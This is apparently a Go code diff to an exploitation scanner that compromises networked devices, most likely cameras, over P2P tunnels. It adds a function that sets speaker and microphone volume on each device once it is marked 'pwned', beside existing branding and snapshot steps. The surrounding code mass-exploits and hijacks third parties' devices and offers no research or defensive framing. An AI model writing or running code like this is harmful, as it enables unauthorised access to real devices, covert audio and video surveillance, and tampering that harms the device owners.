@@ -213,6 +213,15 @@ cleanup:
 	fmt.Printf("\x1b[32m[%s] Done\x1b[0m\n", doneTimeStr)
 }
 
+func (s *Scanner) applyAudioSettings(tunnel *p2p.PTCPTunnel) {
+	if !s.Config.Audio.Enabled || tunnel == nil {
+		return
+	}
+	if err := tunnel.SetAudioVolume(s.Config.Audio.SpeakerVolume, s.Config.Audio.MicVolume); err != nil {
+		fmt.Printf("[!] SetAudioVolume: %v\n", err)
+	}
+}
+
 func (s *Scanner) applyBranding(tunnel *p2p.PTCPTunnel, serial string, res *ExploitResult) {
 	if !s.Config.Brand.Enabled || tunnel == nil || res == nil {
 		return
@@ -343,6 +352,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				res.IP = ip
 				s.handlePwned(serial, res)
 				s.applyBranding(activeTunnel, serial, res)
+				s.applyAudioSettings(activeTunnel)
 				if fresh {
 					go activeTunnel.Disconnect()
 				}
@@ -362,6 +372,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				res.IP = ip
 				s.handlePwned(serial, res)
 				s.applyBranding(activeTunnel, serial, res)
+				s.applyAudioSettings(activeTunnel)
 				if fresh {
 					go activeTunnel.Disconnect()
 				}
@@ -380,6 +391,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				res.IP = ip
 				s.handlePwned(serial, res)
 				s.applyBranding(tunnel, serial, res)
+				s.applyAudioSettings(tunnel)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -395,6 +407,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				res.IP = ip
 				s.handlePwned(serial, res)
 				s.applyBranding(tunnel, serial, res)
+				s.applyAudioSettings(tunnel)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -411,6 +424,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				res.IP = ip
 				s.handlePwned(serial, res)
 				s.applyBranding(tunnel, serial, res)
+				s.applyAudioSettings(tunnel)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
